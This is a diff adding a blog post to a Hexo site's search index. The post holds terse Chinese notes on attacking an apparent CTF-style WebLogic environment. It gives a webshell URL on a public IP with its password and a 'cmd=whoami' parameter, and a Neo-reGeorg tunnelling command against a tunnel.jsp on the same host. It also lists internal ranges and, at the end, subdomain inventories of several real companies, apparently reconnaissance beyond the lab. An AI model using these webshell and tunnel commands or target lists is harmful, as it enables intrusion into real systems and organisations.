+<h5 id="系统管理功能简介"><a href="#系统管理功能简介" class="headerlink" title="系统管理功能简介"></a>系统管理功能简介</h5><p>引擎管理，状态监控，用户管理，角色权限管理</p>
+]]></content>
+      <tags>
+        <tag>设备</tag>
+      </tags>
   </entry>
   <entry>
     <title></title>
@@ -1064,5 +1704,36 @@
     <title>wangzhi的好朋友们</title>
     <url>/link/index.html</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>临时</title>
+    <url>/%E4%B8%B4%E6%97%B6.html</url>
+    <content><![CDATA[<p><a href="http://119.45.114.224:7001/_async/webshell.jsp?password=youli&cmd=whoami">http://119.45.114.224:7001/_async/webshell.jsp?password=youli&amp;cmd=whoami</a></p>
+<p>主机信息：<br>该环境有3台主机，第一台主机访问地址为：119.45.114.224:7001（备用地址：175.27.226.213:7001），剩余两台主机需要各位进行可能的内网代理、端口转发等操作进行发现和渗透<br>当前FLAG2信息如下：<br>meetsec2：在第二台主机的数据库内，格式为“meetsec2{XXX}”，分数为：50分<br>内网范围在：172.16.10.0&#x2F;24、172.25.20.0&#x2F;24、172.26.30.0&#x2F;24</p>
+<p>工具扫一下</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708150827239.png" alt="image-20230708150827239"></p>
+<p>运行ls看一下</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708150839692.png" alt="image-20230708150839692"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>找一下路径</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imge47393833d3027d71eb640c027de5d8.png" alt="e47393833d3027d71eb640c027de5d8"></p>
+<p><del><a href="http://119.45.114.224:7001/">http://119.45.114.224:7001</a></del></p>
+<p><del>&#x2F;root&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls9_async_response&#x2F;8tpkys&#x2F;war&#x2F;</del></p>
+<p>传reg,</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708155723636.png" alt="image-20230708155723636"></p>
+<p>python neoreg.py -k wangzhi -u <a href="http://119.45.114.224:7001/_async/tunnel.jsp">http://119.45.114.224:7001/_async/tunnel.jsp</a></p>
+<p>连接</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708161205134.png" alt="image-20230708161205134"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708162642964.png" alt="image-20230708162642964"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708161711057.png" alt="image-20230708161711057"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708163911244.png" alt="image-20230708163911244"></p>
+<p>&#x2F;root&#x2F;Documents&#x2F;fscan-main</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708190531119.png" alt="image-20230708190531119"></p>
+<p>kylinos.cn<br><a href="http://www.inst.kylinos.cn/">www.inst.kylinos.cn</a><br>servicedesk.kylinos.cn<br>eco.kylinos.cn<br>meeting.kylinos.cn<br>distro-images.kylinos.cn<br>archive2.kylinos.cn<br>smtp.kylinos.cn<br>mail.kylinos.cn<br>id.kylinos.cn<br>education.kylinos.cn<br>edu.kylinos.cn<br>api.kylinos.cn<br>wx.kylinos.cn<br>archive-file.kylinos.cn<br>m.kylinos.cn<br>kylinos.cn<br>oa.kylinos.cn<br><a href="http://www.kylinos.cn/">www.kylinos.cn</a><br>archive.kylinos.cn</p>
+<p>mail.greatwall.com.cn<br>gwservicetest.greatwall.com.cn<br>dns2.greatwall.com.cn<br>dns1.greatwall.com.cn<br>vpn.greatwall.com.cn<br>greatwall.com.cn<br>kk.greatwall.com.cn<br>vp.greatwall.com.cn<br><a href="http://www.greatwall.com.cn/">www.greatwall.com.cn</a><br>gwsite2.greatwall.com.cn<br>ekp.greatwall.com.cn<br>gwoa01.greatwall.com.cn<br>gwsapdev03.greatwall.com.cn<br>oa.greatwall.com.cn<br>avast.com.greatwall.com.cn</p>
+<p>doc.nrec.com<br>mail.nrec.com<br>vpn.nrec.com<br>web.nrec.com<br><a href="http://www.nrec.com/">www.nrec.com</a><br>qys.nrec.com<br><a href="http://www.nslb.nrec.com/">www.nslb.nrec.com</a><br>smtp.nrec.com<br>app.nrec.com<br>esb.nrec.com<br>oa.nrec.com<br>pop.nrec.com<br>imap.nrec.com<br>svn.nrec.com<br>mis.nrec.com</p>
+<p>​	</p>
+]]></content>
   </entry>
 </search>
